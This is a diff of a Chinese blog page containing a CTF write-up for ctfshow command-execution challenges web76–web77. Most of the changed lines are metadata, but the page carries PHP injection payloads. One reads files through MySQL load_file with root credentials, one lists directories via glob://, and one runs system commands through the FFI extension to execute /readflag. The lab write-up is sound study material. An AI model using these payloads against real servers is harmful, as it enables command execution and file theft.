@@ -32,7 +32,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://s2.loli.net/2022/03/26/ez4BhNt5li6Zy3n.png">
 <meta property="article:published_time" content="2022-03-26T10:59:58.104Z">
-<meta property="article:modified_time" content="2022-03-26T11:04:51.619Z">
+<meta property="article:modified_time" content="2022-03-27T04:11:39.288Z">
 <meta property="article:author" content="昊">
 <meta property="article:tag" content="WP">
 <meta property="article:tag" content="命令执行">
@@ -246,9 +246,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2022-03-26 18:59:58 / 修改时间：19:04:51" itemprop="dateCreated datePublished" datetime="2022-03-26T18:59:58+08:00">2022-03-26</time>
+      <time title="创建时间：2022-03-26 18:59:58" itemprop="dateCreated datePublished" datetime="2022-03-26T18:59:58+08:00">2022-03-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-03-27 12:11:39" itemprop="dateModified" datetime="2022-03-27T12:11:39+08:00">2022-03-27</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -441,7 +447,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title class_">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
-<h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><p>第一遍扫描目录c&#x3D;$a&#x3D;new DirectoryIterator(“glob:&#x2F;&#x2F;&#x2F;*”);foreach($a as $f){echo($f-&gt;__toString().’ ‘);}exit(0);然后发现下面有一个readflag肯定是要调用这个,不会做，看了这个FFI拓展挺神奇的，说谁php7.4版本以上才有，大家想了解可以看看下面的参考链接</p>
+<h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><p>第一遍扫描目录<br>c&#x3D;$a&#x3D;new DirectoryIterator(“glob:&#x2F;&#x2F;&#x2F;*”);foreach($a as $f){echo($f-&gt;__toString().’ ‘);}exit(0);然后发现下面有一个readflag肯定是要调用这个,不会做，看了这个FFI拓展挺神奇的，说谁php7.4版本以上才有，大家想了解可以看看下面的参考链接</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span>=<span class="title class_">FFI</span>::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(char *command);&quot;</span>, <span class="string">&quot;libc.so.6&quot;</span>);<span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="keyword">exit</span>();  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
